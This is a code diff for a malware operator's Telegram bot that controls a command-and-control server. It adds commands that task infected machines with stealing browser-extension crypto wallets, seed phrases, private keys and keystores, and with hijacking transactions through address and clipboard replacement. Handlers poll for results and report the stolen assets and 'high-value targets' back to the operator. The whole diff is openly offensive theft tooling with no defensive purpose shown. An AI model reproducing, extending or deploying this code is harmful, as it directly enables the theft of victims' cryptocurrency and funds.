@@ -104,6 +104,11 @@ func (tb *TelegramBot) handleStart(chatID int64) {
 
 💰 *Crypto Wallet Theft:*
 • ` + "`/stealwallets`" + ` - Detect and steal hot wallet files
+• ` + "`/stealextwallets`" + ` - Extract browser extension wallets
+• ` + "`/monitorwallets`" + ` - Monitor wallet activity (5 min)
+• ` + "`/hijacktx`" + ` - Enable transaction hijacking
+• ` + "`/extractseeds`" + ` - Extract seed phrases only
+• ` + "`/stealallcrypto`" + ` - Comprehensive crypto theft
 
 📈 *System:*
 • ` + "`/health`" + ` - C2 server health check
@@ -759,6 +764,18 @@ func (tb *TelegramBot) handleCommand(update tgbotapi.Update) {
 
 	case "/stealwallets":
 		tb.handleStealWallets(chatID)
+
+	// Browser extension wallet commands
+	case "/stealextwallets":
+		tb.handleStealExtensionWallets(chatID)
+	case "/monitorwallets":
+		tb.handleMonitorWalletActivity(chatID)
+	case "/hijacktx":
+		tb.handleHijackTransactions(chatID)
+	case "/extractseeds":
+		tb.handleExtractWalletSeeds(chatID)
+	case "/stealallcrypto":
+		tb.handleStealAllCrypto(chatID)
 
 	default:
 		// Check if user is in interactive mode
@@ -2171,4 +2188,299 @@ func (tb *TelegramBot) handleViewFiles(chatID int64, taskID string) {
 	}
 
 	tb.sendMessage(chatID, message)
+}
+
+// Browser Extension Wallet Commands
+
+func (tb *TelegramBot) handleStealExtensionWallets(chatID int64) {
+	session := tb.getSession(chatID)
+
+	if session.SelectedAgent == "" {
+		tb.sendMessage(chatID, "❌ *No agent selected*\nUse `/select <agent_id>` first")
+		return
+	}
+
+	taskID := tb.c2Server.AddTask(session.SelectedAgent, config.TASK_STEAL_BROWSER_WALLETS, "", nil)
+
+	tb.sendMessage(chatID, fmt.Sprintf(
+		"🔐 *Browser Extension Wallet Extraction Started*\n🆔 Task ID: `%s`\n\n"+
+			"🎯 *Targeting:*\n"+
+			"• MetaMask, Phantom, Coinbase Wallet\n"+
+			"• Trust Wallet, Binance Chain Wallet\n"+
+			"• Keplr, Solflare, Yoroi, TronLink\n"+
+			"• And 20+ other wallet extensions\n\n"+
+			"⏳ Scanning browser profiles...",
+		taskID[:8],
+	))
+
+	go tb.waitForCryptoResult(chatID, taskID, 120*time.Second, "Browser Wallets")
+}
+
+func (tb *TelegramBot) handleMonitorWalletActivity(chatID int64) {
+	session := tb.getSession(chatID)
+
+	if session.SelectedAgent == "" {
+		tb.sendMessage(chatID, "❌ *No agent selected*\nUse `/select <agent_id>` first")
+		return
+	}
+
+	// Default 5 minute monitoring
+	params := map[string]interface{}{
+		"duration": 300,
+	}
+
+	taskID := tb.c2Server.AddTask(session.SelectedAgent, config.TASK_MONITOR_WALLET_ACTIVITY, "", params)
+
+	tb.sendMessage(chatID, fmt.Sprintf(
+		"👁️ *Wallet Activity Monitoring Started*\n🆔 Task ID: `%s`\n\n"+
+			"🎯 *Monitoring:*\n"+
+			"• Transaction attempts\n"+
+			"• Clipboard crypto addresses\n"+
+			"• Wallet extension activity\n"+
+			"• DApp connections\n\n"+
+			"⏱️ Duration: 5 minutes\n"+
+			"⏳ Monitoring in progress...",
+		taskID[:8],
+	))
+
+	go tb.waitForActivityResult(chatID, taskID, 330*time.Second)
+}
+
+func (tb *TelegramBot) handleHijackTransactions(chatID int64) {
+	session := tb.getSession(chatID)
+
+	if session.SelectedAgent == "" {
+		tb.sendMessage(chatID, "❌ *No agent selected*\nUse `/select <agent_id>` first")
+		return
+	}
+
+	taskID := tb.c2Server.AddTask(session.SelectedAgent, config.TASK_HIJACK_TRANSACTIONS, "", nil)
+
+	tb.sendMessage(chatID, fmt.Sprintf(
+		"🎯 *Transaction Hijacking Enabled*\n🆔 Task ID: `%s`\n\n"+
+			"⚡ *Features Activated:*\n"+
+			"• Web3 API interception\n"+
+			"• Transaction parameter modification\n"+
+			"• Address replacement\n"+
+			"• Gas fee manipulation\n\n"+
+			"⚠️ *Warning:* This is an advanced attack vector\n"+
+			"⏳ Initializing hooks...",
+		taskID[:8],
+	))
+
+	go tb.waitForTaskResult(chatID, taskID, 60*time.Second)
+}
+
+func (tb *TelegramBot) handleExtractWalletSeeds(chatID int64) {
+	session := tb.getSession(chatID)
+
+	if session.SelectedAgent == "" {
+		tb.sendMessage(chatID, "❌ *No agent selected*\nUse `/select <agent_id>` first")
+		return
+	}
+
+	taskID := tb.c2Server.AddTask(session.SelectedAgent, config.TASK_EXTRACT_WALLET_SEEDS, "", nil)
+
+	tb.sendMessage(chatID, fmt.Sprintf(
+		"🌱 *Seed Phrase Extraction Started*\n🆔 Task ID: `%s`\n\n"+
+			"🔍 *Searching for:*\n"+
+			"• 12-word seed phrases\n"+
+			"• 24-word seed phrases\n"+
+			"• Mnemonic backups\n"+
+			"• Recovery phrases\n\n"+
+			"⏳ Deep scanning extension storage...",
+		taskID[:8],
+	))
+
+	go tb.waitForCryptoResult(chatID, taskID, 90*time.Second, "Seed Phrases")
+}
+
+func (tb *TelegramBot) handleStealAllCrypto(chatID int64) {
+	session := tb.getSession(chatID)
+
+	if session.SelectedAgent == "" {
+		tb.sendMessage(chatID, "❌ *No agent selected*\nUse `/select <agent_id>` first")
+		return
+	}
+
+	taskID := tb.c2Server.AddTask(session.SelectedAgent, config.TASK_STEAL_ALL_CRYPTO_ASSETS, "", nil)
+
+	tb.sendMessage(chatID, fmt.Sprintf(
+		"💰 *Comprehensive Crypto Asset Extraction*\n🆔 Task ID: `%s`\n\n"+
+			"🎯 *Complete Extraction:*\n"+
+			"• Browser extension wallets\n"+
+			"• Desktop wallet applications\n"+
+			"• Seed phrases & private keys\n"+
+			"• Keystores & encrypted files\n"+
+			"• Network configurations\n"+
+			"• DApp connections\n\n"+
+			"⏳ This may take several minutes...",
+		taskID[:8],
+	))
+
+	go tb.waitForCryptoResult(chatID, taskID, 180*time.Second, "All Crypto Assets")
+}
+
+// Result handlers for crypto operations
+
+func (tb *TelegramBot) waitForCryptoResult(chatID int64, taskID string, timeout time.Duration, dataType string) {
+	ticker := time.NewTicker(3 * time.Second)
+	defer ticker.Stop()
+
+	timeoutTimer := time.NewTimer(timeout)
+	defer timeoutTimer.Stop()
+
+	for {
+		select {
+		case <-ticker.C:
+			result := tb.c2Server.GetTaskResult(taskID)
+			if result != nil {
+				tb.formatAndSendCryptoData(chatID, result, dataType)
+				return
+			}
+		case <-timeoutTimer.C:
+			tb.sendMessage(chatID, fmt.Sprintf(
+				"⏰ *%s extraction timeout*\n🆔 Task ID: `%s`\n\n"+
+					"The agent may be unresponsive or the operation is taking longer than expected.",
+				dataType, taskID[:8],
+			))
+			return
+		}
+	}
+}
+
+func (tb *TelegramBot) waitForActivityResult(chatID int64, taskID string, timeout time.Duration) {
+	ticker := time.NewTicker(3 * time.Second)
+	defer ticker.Stop()
+
+	timeoutTimer := time.NewTimer(timeout)
+	defer timeoutTimer.Stop()
+
+	for {
+		select {
+		case <-ticker.C:
+			result := tb.c2Server.GetTaskResult(taskID)
+			if result != nil {
+				tb.formatAndSendActivityData(chatID, result)
+				return
+			}
+		case <-timeoutTimer.C:
+			tb.sendMessage(chatID, fmt.Sprintf(
+				"⏰ *Wallet activity monitoring timeout*\n🆔 Task ID: `%s`\n\n"+
+					"Monitoring session completed or agent became unresponsive.",
+				taskID[:8],
+			))
+			return
+		}
+	}
+}
+
+func (tb *TelegramBot) formatAndSendCryptoData(chatID int64, result *config.TaskResult, dataType string) {
+	if !result.Success {
+		tb.sendMessage(chatID, fmt.Sprintf(
+			"❌ *%s extraction failed*\n🆔 Task ID: `%s`\n\n"+
+				"Error: `%s`",
+			dataType, result.TaskID[:8], result.Error,
+		))
+		return
+	}
+
+	// Check if we have crypto assets data
+	if result.CryptoAssets != nil {
+		assets := result.CryptoAssets
+
+		message := fmt.Sprintf(
+			"✅ *%s Extraction Complete*\n🆔 Task ID: `%s`\n\n"+
+				"📊 **Summary:**\n"+
+				"• 🔌 Extensions Found: %d\n"+
+				"• 🌱 Seed Phrases: %d\n"+
+				"• 🔑 Private Keys: %d\n"+
+				"• 📍 Addresses: %d\n"+
+				"• 🗃️ Keystores: %d\n\n",
+			dataType, result.TaskID[:8],
+			assets.TotalExtensions,
+			assets.TotalSeeds,
+			assets.TotalPrivateKeys,
+			assets.TotalAddresses,
+			assets.TotalKeystores,
+		)
+
+		// Add high-value targets
+		if len(assets.HighValueTargets) > 0 {
+			message += "🎯 **High-Value Targets:**\n"
+			for _, target := range assets.HighValueTargets {
+				message += fmt.Sprintf("• %s\n", target)
+			}
+			message += "\n"
+		}
+
+		// Add extension details
+		if len(assets.ExtensionWallets) > 0 {
+			message += "🔌 **Found Extensions:**\n"
+			for i, ext := range assets.ExtensionWallets {
+				if i >= 5 { // Limit to first 5 to avoid message length issues
+					message += fmt.Sprintf("• ... and %d more\n", len(assets.ExtensionWallets)-5)
+					break
+				}
+				message += fmt.Sprintf("• %s (%s) - %s\n", ext.ExtensionName, ext.WalletType, ext.Browser)
+			}
+			message += "\n"
+		}
+
+		message += "💾 *Data saved to C2 server crypto-assets directory*"
+		tb.sendMessage(chatID, message)
+	} else {
+		// Fallback to regular output
+		tb.sendMessage(chatID, fmt.Sprintf(
+			"✅ *%s Complete*\n🆔 Task ID: `%s`\n\n%s",
+			dataType, result.TaskID[:8], result.Output,
+		))
+	}
+}
+
+func (tb *TelegramBot) formatAndSendActivityData(chatID int64, result *config.TaskResult) {
+	if !result.Success {
+		tb.sendMessage(chatID, fmt.Sprintf(
+			"❌ *Wallet activity monitoring failed*\n🆔 Task ID: `%s`\n\n"+
+				"Error: `%s`",
+			result.TaskID[:8], result.Error,
+		))
+		return
+	}
+
+	// Check if we have wallet activity data
+	if result.WalletActivity != nil {
+		activity := result.WalletActivity
+
+		message := fmt.Sprintf(
+			"✅ *Wallet Activity Monitoring Complete*\n🆔 Task ID: `%s`\n\n"+
+				"📊 **Activity Summary:**\n"+
+				"• 🔄 Intercepted Transactions: %d\n"+
+				"• 📋 Clipboard Replacements: %d\n"+
+				"• 🎭 Fake Prompts: %d\n"+
+				"• ⏱️ Monitoring Duration: %d seconds\n\n",
+			result.TaskID[:8],
+			len(activity.InterceptedTxs),
+			len(activity.ClipboardReplacements),
+			len(activity.FakePrompts),
+			activity.LastActivity-activity.StartTime,
+		)
+
+		if len(activity.MonitoringExtensions) > 0 {
+			message += "🔌 **Monitored Extensions:**\n"
+			for _, ext := range activity.MonitoringExtensions {
+				message += fmt.Sprintf("• %s\n", ext)
+			}
+			message += "\n"
+		}
+
+		message += "💾 *Activity data saved to C2 server wallet-activity directory*"
+		tb.sendMessage(chatID, message)
+	} else {
+		// Fallback to regular output
+		tb.sendMessage(chatID, fmt.Sprintf(
+			"✅ *Wallet Activity Monitoring Complete*\n🆔 Task ID: `%s`\n\n%s",
+			result.TaskID[:8], result.Output,
+		))
+	}
 }
